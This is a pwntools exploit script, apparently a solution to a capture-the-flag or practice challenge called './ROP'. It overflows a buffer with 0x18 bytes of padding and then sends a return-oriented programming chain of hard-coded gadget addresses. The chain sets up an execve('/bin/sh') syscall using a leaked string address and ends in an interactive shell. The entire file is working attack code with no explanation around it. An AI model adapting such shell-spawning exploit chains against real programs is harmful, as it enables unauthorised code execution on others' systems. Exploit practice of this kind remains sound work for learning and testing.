from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

pop_rax_ret = 0x0000000000451467
pop_rdi_ret = 0x0000000000401862
pop_rsi_ret = 0x000000000040f1ae
pop_rdx_ret = 0x000000000040176f
syscall = 0x00000000004012d3

r = process('./ROP')

binsh = int(r.recvline().strip().split(b': ')[1], 16)

r.sendlineafter(b': ', b'a' * 0x18 + flat(
    pop_rax_ret, 0x3b, 
    pop_rdi_ret, binsh,
    pop_rsi_ret, 0, 
    pop_rdx_ret, 0, 
    syscall
))

r.interactive()